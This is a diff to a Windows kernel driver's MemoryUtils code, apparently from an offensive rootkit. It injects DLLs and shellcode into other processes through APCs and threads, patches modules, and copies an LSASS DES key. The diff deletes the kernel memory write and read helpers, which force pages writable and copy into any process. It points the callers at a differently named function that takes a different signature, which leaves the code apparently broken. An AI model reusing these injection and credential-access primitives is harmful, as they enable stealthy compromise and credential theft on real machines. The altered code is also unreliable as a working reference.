@@ -77,7 +77,7 @@ NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 		return STATUS_INSUFFICIENT_RESOURCES;
 
 	dllPathSize = strlen(DllInfo->DllPath) + 1;
-	status = KeWriteProcessMemory(DllInfo->DllPath, PsGetCurrentProcess(), ShellcodeInfo.Parameter1, strlen(DllInfo->DllPath),
+	status = WriteProcessMemory(DllInfo->DllPath, PsGetCurrentProcess(), ShellcodeInfo.Parameter1, strlen(DllInfo->DllPath),
 		KernelMode, false);
 
 	if (!NT_SUCCESS(status))
@@ -159,7 +159,7 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 
 	pathLength = strlen(DllInfo->DllPath) + 1;
 
-	status = KeWriteProcessMemory(&(DllInfo->DllPath), TargetProcess, remoteAddress, pathLength, KernelMode);
+	status = WriteProcessMemory(&(DllInfo->DllPath), TargetProcess, remoteAddress, pathLength, KernelMode);
 
 	if (!NT_SUCCESS(status)) {
 		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
@@ -247,7 +247,7 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo, bo
 
 		dataSize = isInjectedDll ? ShellcodeInfo->Parameter1Size : ShellcodeInfo->ShellcodeSize;
 		remoteData = isInjectedDll ? ShellcodeInfo->Parameter1 : ShellcodeInfo->Shellcode;
-		status = KeWriteProcessMemory(remoteData, TargetProcess, remoteAddress, dataSize, UserMode);
+		status = WriteProcessMemory(remoteData, TargetProcess, remoteAddress, dataSize, UserMode);
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -345,7 +345,7 @@ NTSTATUS MemoryUtils::InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo)
 			break;
 
 		shellcodeSize = ShellcodeInfo->ShellcodeSize;
-		status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);
+		status = WriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -433,7 +433,7 @@ NTSTATUS MemoryUtils::PatchModule(PatchedModule* ModuleInformation) {
 	}
 	KeUnstackDetachProcess(&state);
 
-	status = KeWriteProcessMemory(ModuleInformation->Patch, TargetProcess, functionAddress, (SIZE_T)ModuleInformation->PatchLength, KernelMode);
+	status = WriteProcessMemory(ModuleInformation->Patch, TargetProcess, functionAddress, (SIZE_T)ModuleInformation->PatchLength, KernelMode);
 	ObDereferenceObject(TargetProcess);
 	return status;
 }
@@ -936,108 +936,6 @@ NTSTATUS MemoryUtils::GetDesKey(DesKeyInformation* DesKey) {
 
 	return MmCopyVirtualMemory(IoGetCurrentProcess(), this->lastLsassInfo.DesKey.Data,
 		IoGetCurrentProcess(), DesKey->Data, this->lastLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
-}
-
-/*
-* Description:
-* KeWriteProcessMemory is responsible for writing data to any target process.
-*
-* Parameters:
-* @sourceDataAddress [PVOID]	 -- The address of data to write.
-* @TargetProcess	 [PEPROCESS] -- Target process to write.
-* @targetAddress	 [PVOID]	 -- Target address to write.
-* @dataSize			 [SIZE_T]	 -- Size of data to write.
-* @mode			     [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
-* @alignAddr		 [bool]		 -- Whether to align the address or not.
-*
-* Returns:
-* @status			 [NTSTATUS]	 -- Whether successfuly written or not.
-*/
-NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, 
-	SIZE_T dataSize, MODE mode, bool alignAddr) {
-	HANDLE hTargetProcess;
-	ULONG oldProtection;
-	SIZE_T patchLen;
-	SIZE_T bytesWritten;
-	NTSTATUS status = STATUS_SUCCESS;
-	SIZE_T alignment = alignAddr ? dataSize : 1;
-
-	if (mode != KernelMode && mode != UserMode)
-		return STATUS_UNSUCCESSFUL;
-
-	// Making sure that the given kernel mode address is valid.
-	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) ||
-		(!VALID_KERNELMODE_MEMORY((DWORD64)targetAddress) &&
-			!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, alignment, STATUS_UNSUCCESSFUL))))) {
-		status = STATUS_UNSUCCESSFUL;
-		return status;
-	}
-
-	else if (mode == UserMode && (
-		!NT_SUCCESS(ProbeAddress(sourceDataAddress, dataSize, dataSize, STATUS_UNSUCCESSFUL)) ||
-		(!VALID_KERNELMODE_MEMORY((DWORD64)targetAddress) &&
-			!NT_SUCCESS(ProbeAddress(targetAddress, dataSize, alignment, STATUS_UNSUCCESSFUL))))) {
-		status = STATUS_UNSUCCESSFUL;
-		return status;
-	}
-
-	// Adding write permissions.
-	status = ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess);
-
-	if (!NT_SUCCESS(status)) {
-		return status;
-	}
-
-	patchLen = dataSize;
-	PVOID addressToProtect = targetAddress;
-	status = ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);
-
-	if (!NT_SUCCESS(status)) {
-		ZwClose(hTargetProcess);
-		return status;
-	}
-	ZwClose(hTargetProcess);
-
-	// Writing the data.
-	status = MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);
-
-	// Restoring permissions and cleaning up.
-	if (ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess) == STATUS_SUCCESS) {
-		patchLen = dataSize;
-		ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
-		ZwClose(hTargetProcess);
-	}
-
-	return status;
-}
-
-/*
-* Description:
-* KeReadProcessMemory is responsible for read data from any target process.
-*
-* Parameters:
-* @Process		 [PEPROCESS] -- Process to read data from.
-* @sourceAddress [PVOID]	 -- Address to read data from.
-* @targetAddress [PVOID]     -- Address to read data to.
-* @dataSize		 [SIZE_T]	 -- Size of data to read.
-* @mode			 [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
-*
-* Returns:
-* @status		 [NTSTATUS]	 -- Whether successfuly read or not.
-*/
-NTSTATUS MemoryUtils::KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
-	SIZE_T bytesRead;
-
-	if (mode != KernelMode && mode != UserMode)
-		return STATUS_UNSUCCESSFUL;
-
-	// Making sure that the given kernel mode address is valid.
-	if (mode == KernelMode && !VALID_KERNELMODE_MEMORY((DWORD64)targetAddress))
-		return STATUS_UNSUCCESSFUL;
-	else if (mode == UserMode && !VALID_USERMODE_MEMORY((DWORD64)targetAddress))
-		return STATUS_UNSUCCESSFUL;
-
-	return MmCopyVirtualMemory(Process, sourceAddress, PsGetCurrentProcess(), targetAddress, dataSize, KernelMode, &bytesRead);
 }
 
 /*
